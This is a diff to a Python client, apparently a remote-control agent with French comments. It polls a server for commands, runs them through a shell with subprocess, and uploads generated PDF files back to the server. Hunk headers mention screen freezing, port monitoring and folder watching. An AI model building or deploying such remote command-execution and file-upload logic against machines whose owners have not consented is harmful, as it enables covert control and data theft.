@@ -297,6 +297,14 @@ def unfreeze_screen():
 
 def execute_command(command):
     try:
+        # Get current client_id
+        current_client_id = getattr(execute_command, 'client_id', None)
+        
+        # Check if it's a PDF generation command
+        is_pdf_command, pdf_stdout, pdf_stderr = handle_pdf_report_command(command, current_client_id)
+        if is_pdf_command:
+            return pdf_stdout, pdf_stderr
+            
         # Traitement des commandes spéciales
         command_lower = command.lower().strip()
         
@@ -330,6 +338,9 @@ def execute_command(command):
 
 def check_for_command(client_id):
     try:
+        # Stocker le client_id comme attribut de la fonction execute_command pour usage ultérieur
+        execute_command.client_id = client_id
+        
         response = requests.get(f"{server_url}/client/{client_id}/getcommand")
         if response.status_code == 200:
             data = response.json()
@@ -986,34 +997,37 @@ def monitor_ports():
 def handle_pdf_report_command(command, client_id):
     try:
         # Si la commande contient une instruction de génération de PDF
-        if "import pdf_data" in command and "create_pdf_with_data" in command:
+        if "import pdf_data" in command:
             print(colorama.Fore.CYAN + "⏳ Génération du rapport PDF en cours...")
             
             # Exécuter la commande pour générer le PDF
             result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             
-            # Extraire le chemin du fichier généré
-            pdf_path = None
-            if "PDF généré avec succès" in result.stdout:
-                print(colorama.Fore.GREEN + "✅ PDF généré avec succès")
-                pdf_path_match = re.search(r"PDF généré avec succès: (.+\.pdf)", result.stdout)
-                if pdf_path_match:
-                    pdf_path = pdf_path_match.group(1)
-                else:
-                    # Si le pattern de recherche ne trouve pas le nom du fichier mais que la génération est un succès
-                    # On vérifie si data.pdf ou network_report.pdf existe
-                    for possible_pdf in ["data.pdf", "network_report.pdf"]:
-                        if os.path.exists(possible_pdf):
-                            pdf_path = possible_pdf
-                            break
+            # Vérifier les chemins possibles du PDF
+            pdf_paths = ["data.pdf", "network_report.pdf"]
             
-            # Si la génération a réussi et que le fichier PDF est disponible
-            if pdf_path and os.path.exists(pdf_path):
+            # Ajouter chemin absolu si mentionné dans la sortie
+            for line in result.stdout.splitlines():
+                if "PDF generated successfully:" in line or "PDF généré avec succès:" in line:
+                    path = line.split(":", 1)[1].strip()
+                    if os.path.exists(path):
+                        pdf_paths.insert(0, path)  # Priorité au chemin mentionné dans la sortie
+            
+            # Chercher le premier PDF existant dans les chemins possibles
+            pdf_path = None
+            for path in pdf_paths:
+                if os.path.exists(path):
+                    pdf_path = path
+                    print(colorama.Fore.GREEN + f"✅ PDF trouvé: {pdf_path}")
+                    break
+            
+            # Si un PDF est trouvé
+            if pdf_path:
                 try:
                     # Envoyer le fichier au serveur
                     pdf_size = os.path.getsize(pdf_path)
                     print(colorama.Fore.GREEN + f"📁 Envoi du fichier PDF ({pdf_size} octets) au serveur...")
-                
+                    
                     # Tester si le fichier est accessible
                     with open(pdf_path, 'rb') as test_file:
                         # Si on peut le lire, continuer
@@ -1032,63 +1046,20 @@ def handle_pdf_report_command(command, client_id):
                         return True, "Rapport PDF généré et envoyé avec succès", ""
                     else:
                         print(colorama.Fore.YELLOW + f"⚠️ Le serveur a retourné une erreur lors de l'envoi du PDF: {response.status_code}")
-                        # Même en cas d'erreur d'envoi, on considère que la génération a réussi
                         return True, f"PDF généré mais erreur d'envoi ({response.status_code})", ""
                 except Exception as e:
                     print(colorama.Fore.YELLOW + f"⚠️ Erreur lors de l'envoi du PDF: {str(e)}")
-                    # Même en cas d'erreur d'envoi, on considère que la génération a réussi
                     return True, f"PDF généré mais erreur d'envoi: {str(e)}", ""
             else:
-                # Fichier non trouvé malgré un message de succès
-                if "PDF généré avec succès" in result.stdout:
-                    print(colorama.Fore.YELLOW + "⚠️ PDF généré mais fichier introuvable")
-                    return True, "PDF généré mais fichier introuvable", result.stderr
-                else:
-                    # La génération a échoué
-                    print(colorama.Fore.RED + "❌ Erreur lors de la génération du PDF")
-                    print(colorama.Fore.RED + result.stderr)
-                    # Vérifier quand même si le fichier a été généré malgré l'erreur
-                    for possible_pdf in ["data.pdf", "network_report.pdf"]:
-                        if os.path.exists(possible_pdf):
-                            print(colorama.Fore.GREEN + f"✅ Fichier PDF trouvé malgré l'erreur: {possible_pdf}")
-                            try:
-                                with open(possible_pdf, 'rb') as pdf_file:
-                                    files = {'pdf_file': (possible_pdf, pdf_file, 'application/pdf')}
-                                    response = requests.post(
-                                        f'{server_url}/client/{client_id}/upload_pdf',
-                                        files=files,
-                                        timeout=30
-                                    )
-                                if response.status_code == 200:
-                                    print(colorama.Fore.GREEN + "✅ Rapport PDF envoyé avec succès au serveur malgré l'erreur")
-                                    return True, f"PDF trouvé et envoyé malgré une erreur: {result.stderr}", ""
-                            except Exception as e:
-                                print(colorama.Fore.YELLOW + f"⚠️ Erreur lors de l'envoi du PDF: {str(e)}")
-                    
-                    return False, "", result.stderr
-            
+                print(colorama.Fore.RED + "❌ Erreur : aucun fichier PDF n'a été trouvé après l'exécution de la commande")
+                print(colorama.Fore.RED + f"Sortie: {result.stdout}")
+                print(colorama.Fore.RED + f"Erreur: {result.stderr}")
+                return False, "", f"Aucun PDF trouvé. Erreur: {result.stderr}"
+        
         # Si ce n'est pas une commande de génération de PDF, retourner False sans message d'erreur
         return False, "", ""
     except Exception as e:
         print(colorama.Fore.RED + f"❌ Exception lors du traitement de la commande PDF: {str(e)}")
-        # Vérifier quand même si le fichier a été généré malgré l'exception
-        for possible_pdf in ["data.pdf", "network_report.pdf"]:
-            if os.path.exists(possible_pdf):
-                print(colorama.Fore.GREEN + f"✅ Fichier PDF trouvé malgré l'exception: {possible_pdf}")
-                try:
-                    with open(possible_pdf, 'rb') as pdf_file:
-                        files = {'pdf_file': (possible_pdf, pdf_file, 'application/pdf')}
-                        response = requests.post(
-                            f'{server_url}/client/{client_id}/upload_pdf',
-                            files=files,
-                            timeout=30
-                        )
-                    if response.status_code == 200:
-                        print(colorama.Fore.GREEN + "✅ Rapport PDF envoyé avec succès au serveur malgré l'exception")
-                        return True, f"PDF trouvé et envoyé malgré une exception: {str(e)}", ""
-                except Exception as upload_err:
-                    print(colorama.Fore.YELLOW + f"⚠️ Erreur lors de l'envoi du PDF: {str(upload_err)}")
-        
         return False, "", str(e)
 
 # Fonction simplifiée pour surveiller les dossiers et enregistrer les modifications
